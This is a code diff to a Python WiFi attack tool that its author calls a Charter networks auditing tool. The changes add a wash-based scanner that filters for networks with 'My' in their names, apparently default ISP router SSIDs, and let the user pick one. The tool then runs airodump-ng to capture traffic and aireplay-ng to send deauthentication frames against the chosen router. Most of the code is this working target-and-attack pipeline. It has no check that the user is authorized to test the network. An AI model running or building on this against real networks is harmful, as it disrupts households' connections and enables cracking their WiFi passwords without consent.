@@ -13,22 +13,6 @@ ROOT = 'sudo'
 
 # Functions
 def welcome():
-    # print(Fore.RED)
-    # print('          ▀▀▀██████▄▄▄          ')
-    # print('                 ▀▀▀████▄       ')
-    # print('          ▄███████▀   ▀███▄     ')
-    # print('        ▄███████▀       ▀███▄   ')
-    # print('      ▄████████           ███▄  ')
-    # print('     ██████████▄           ███▌   ██████╗ ██╗   ██╗██████╗     ███████╗██████╗ ███████╗ ██████╗████████╗██████╗ ██╗   ██╗███╗   ███╗    ██╗    ██╗██╗███████╗██╗')
-    # print('     ▀█████▀ ▀███▄         ▐███  ██╔═══██╗██║   ██║██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║   ██║████╗ ████║    ██║    ██║██║██╔════╝██║')
-    # print('       ▀█▀     ▀███▄       ▐███  ██║   ██║██║   ██║██████╔╝    ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝██║   ██║██╔████╔██║    ██║ █╗ ██║██║█████╗  ██║')
-    # print('                 ▀███▄     ███▌  ██║   ██║██║   ██║██╔══██╗    ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██║╚██╔╝██║    ██║███╗██║██║██╔══╝  ██║')
-    # print('    ▄██▄           ▀███▄  ▐███   ╚██████╔╝╚██████╔╝██║  ██║    ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║    ╚███╔███╔╝██║██║     ██║')
-    # print('  ▄██████▄           ▀███▄███     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝')
-    # print(' █████▀▀████▄▄        ▄█████    ')
-    # print(' ████▀   ▀▀█████▄▄▄▄█████████▄                                                 A WiFi Auditing Tool By Edward Ayala')
-    # print('  ▀▀         ▀▀██████▀▀   ▀▀██  ')            
-
     print(Fore.BLUE)
     print(' ,--------------------------.')
     print('( Change Your WiFi Password! )   .-.')
@@ -44,8 +28,7 @@ def welcome():
     print("                 /  _ )   ,'   `-. `-. \\     Charter(networks) Auditing Tool")
     print("                / ,' /  ,\'        \ \ \ \             by Edward Ayala")
     print("               / /  / ,'          (,_)(,_)")
-    print('              (,;  (,,)')
-                                                                                                 
+    print('              (,;  (,,)')                                                                             
     print(Style.RESET_ALL)
     
 def getInterface(choice):
@@ -71,7 +54,8 @@ mode = getInterface(1)
 def checkInterface():
     if getInterface(1) == 'Monitor':        
         print(Fore.GREEN,'Interface is in Monitor mode!',Fore.BLUE,'\n Searching for target networks...',Style.RESET_ALL)
-        findTarget()
+        # findTargetAirodump()
+        findTargetWash()
     elif getInterface(1) == 'Managed':
         print(Fore.RED,'Interface is not in Monitor mode',Fore.YELLOW,'\n Changing to Monitor Mode...',Style.RESET_ALL)
         checkProcesses()
@@ -102,36 +86,37 @@ def monitorToggle(interface, mode):     # Runs airmon-ng to start/stop Monitor m
         sp.run(['airmon-ng','stop',getInterface(0)], capture_output=True)    # Toggle Managed Mode
         sp.run(['NetworkManager'])     # Restart NetworkMananger to connect to Internet
         print(Fore.GREEN,'Monitor Mode Disabled & Internet Capabilities Re-Enabled',Style.RESET_ALL)
-
-def findTarget():
+# Find target using Airodump-ng includes findTargetAirodump(), findFile(), & readFile() - Not the best solution
+# -------------------------------------------------------------------------------------------------------------
+def findTargetAirodump():
     command = ['airodump-ng','-K','1','-R',"'(My.)'",'-w','targets','--output-format','csv',getInterface(0),]
     process = sp.Popen(command, stdout=sp.PIPE, text=True)
     # print(Fore.BLUE,'Scanning for networks')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.RED,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.YELLOW,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.LIGHTGREEN_EX,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.GREEN,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.CYAN,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.BLUE,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.CYAN,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.GREEN,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.LIGHTGREEN_EX,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.YELLOW,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...')
-    t.sleep(1)
+    t.sleep(2)
     print(Fore.RED,'Scanning for networks...')
     # Scan for about 12 seconds for best results
     process.send_signal(signal.SIGINT)
@@ -158,7 +143,6 @@ def findFile():
         return ls[select]
     else:
         return ls[0]
-    
 
 def readFile():
     # initial internal variables - file, count, networks, & choice
@@ -169,7 +153,6 @@ def readFile():
     with open(file, 'r') as csvfile: 
         # creating a csv reader object 
         csvreader = csv.reader(csvfile) 
-
         # print header
         print(Fore.BLUE,'+---#--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
         for row in csvreader:
@@ -190,6 +173,7 @@ def readFile():
                 continue
             # display and put networks in a dictionary that conatins a list of properties
             else:
+                print(row)
                 count += 1 
                 BSSID = row[5]  # Network MAC address | either 0 or 5... idk yet
                 Power = row[3].strip()  # Network Power level
@@ -199,7 +183,77 @@ def readFile():
                 print(Fore.BLUE,'+-------------------------------------------------------------------------------------------+',Fore.CYAN)
                 networks[count] = [BSSID,Power,Channel,Name]
     print(networks)
+    choice  = int(input('Select a network: '))
+    print('Selected:',networks[choice])
+    attack(networks[choice])
+# -------------------------------------------------------------------------------------------------------------
 
+# Find target using Wash doesn't make any files - All-in-One, clean function
+def findTargetWash():
+    # Local variables
+    networks = {}
+    count = 0
+    # Command list
+    command = ['wash','-a','-i',getInterface(0)]
+    # Run command using subprocess 
+    process_Wash = sp.Popen(command, stdout=sp.PIPE ,text=True)
+    # Sleep for about 26 seconds
+    t.sleep(2)
+    print(Fore.RED,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.YELLOW,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.LIGHTGREEN_EX,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.GREEN,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.CYAN,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.BLUE,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.CYAN,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.GREEN,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.LIGHTGREEN_EX,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.YELLOW,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.LIGHTMAGENTA_EX,'Scanning for networks...')
+    t.sleep(2)
+    print(Fore.RED,'Scanning for networks...')
+    # Send keyboard interrupt | CTRL+C equivalent
+    process_Wash.send_signal(signal.SIGINT)
+    # Export output of command to list split by newline
+    output = process_Wash.stdout.read().splitlines()
+
+    # Print header
+    print(Fore.BLUE,'+---#--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
+    # Traverse output list
+    for x in output:
+        # Skip non-Charter networks
+        if not x.__contains__('My'):
+            continue
+        else:
+            count += 1
+            # Split the list by spaces
+            row = x.split(' ')
+            # Remove 'some' empty columns - idk why it doesn't remove all of them
+            for y in row:
+                if y == '':
+                    row.remove(y)
+            # Significant variables
+            BSSID = row[0]
+            Channel = row[1]
+            Power = row[2]
+            ESSID = row[-1]
+            # Indexed list - Dict of lists
+            networks[count] = [BSSID, Channel, Power, ESSID]
+            # Print the list of scanned networks
+            print(Fore.BLUE, '| ', Fore.WHITE, count, ' ', BSSID, '      ', Power, '                ', Channel, '        ', ESSID, Fore.BLUE,'      |',Style.RESET_ALL)
+            print(Fore.BLUE,'+-------------------------------------------------------------------------------------------+',Fore.CYAN)
     choice  = int(input('Select a network: '))
     print('Selected:',networks[choice])
     attack(networks[choice])
@@ -213,7 +267,7 @@ def attack(target):
     interface = getInterface(0)
 
     # Commands - airodump-ng: capture data & aireplay-ng: deauth network
-    command_1 = ['airodump-ng','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
+    command_1 = ['airodump-ng','-K','1','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
     command_2 = ['aireplay-ng','--deauth',5,'-a',BSSID,interface]
 
     process_1 = sp.Popen(command_1)
@@ -256,7 +310,7 @@ def start():
     getInterface(None) # prints interface information
 
 
-
+# Main function calls
 welcome()       # prints title
 # start()         # Start the process/function/procedure tree
 
@@ -264,3 +318,5 @@ welcome()       # prints title
 # readFile()
 
 # monitorToggle(getInterface(0),1)
+
+findTargetWash()
